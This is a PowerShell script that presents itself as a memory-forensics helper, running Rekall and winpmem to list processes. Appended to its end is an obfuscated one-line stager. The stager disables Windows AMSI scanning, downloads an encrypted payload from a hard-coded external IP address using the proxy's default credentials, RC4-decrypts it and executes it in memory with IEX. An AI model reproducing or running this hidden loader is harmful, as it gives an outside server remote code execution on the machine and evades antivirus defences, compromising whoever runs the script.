﻿


Function Expand-Zip ($zipfile, $destination) {
	[int32]$copyOption = 16 
    $shell = New-Object -ComObject shell.application
    $zip = $shell.Namespace($zipfile)
    foreach($item in $zip.items()) {
        $shell.Namespace($destination).copyhere($item, $copyOption)
    }
}

$rkpath = ($env:SystemRoot + "\rekall.zip")

if (Test-Path ($rkpath)) {
    $suppress = New-Item -Name rekall -ItemType Directory -Path $env:Temp -Force
    $rkdest = ($env:Temp + "\rekall\")
    Expand-Zip $rkpath $env:Temp
    if (Test-Path($rkdest + "\rekal.exe")) {
        $suppress = & $rkdest\winpmem_1.5.5.exe -l
        & $rkdest\rekal.exe -f \\.\pmem pslist
        $suppress = & $rkdest\winpmem_1.5.5.exe -u
        $suppress = Remove-Item $rkdest -Force -Recurse
    } else {
        "rekall.zip found, but not unzipped."
    }
} else {
    "rekall.zip not found on $env:COMPUTERNAME"
}
[ReF].ASSEmbly.GetTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIElD('amsiInitFailed','NonPublic,Static').SetVAlue($Null,$True)};[SySteM.Net.SErviCEPOINTMaNAger]::ExPeCt100ConTinue=0;$wC=NEW-OBjEcT System.NET.WebClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdERs.ADD('User-Agent',$u);$wC.PRoxY=[SYStEm.NET.WEBREQuEst]::DeFaUlTWEbProXY;$Wc.ProXY.CREDenTIALs = [SYSteM.NEt.CReDentIalCAcHe]::DeFAulTNetwORKCREdEntialS;$K=[SySTEm.TexT.EncodING]::ASCII.GETBYteS('Dv,inKZ<@{3mjG4&1k:Vcl7o)EY*J?6x');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-Bxor$S[($S[$I]+$S[$H])%256]}};$Wc.HEaDERs.ADD("Cookie","session=Pu8sEnIpxIwINbUOVsxlL66DoHA=");$ser='http://35.165.38.15:80';$t='/login/process.php';$dATa=$WC.DowNLOadDAtA($ser+$T);$IV=$DaTA[0..3];$Data=$DaTa[4..$DAtA.leNgTH];-JoIn[CHAr[]](& $R $data ($IV+$K))|IEX

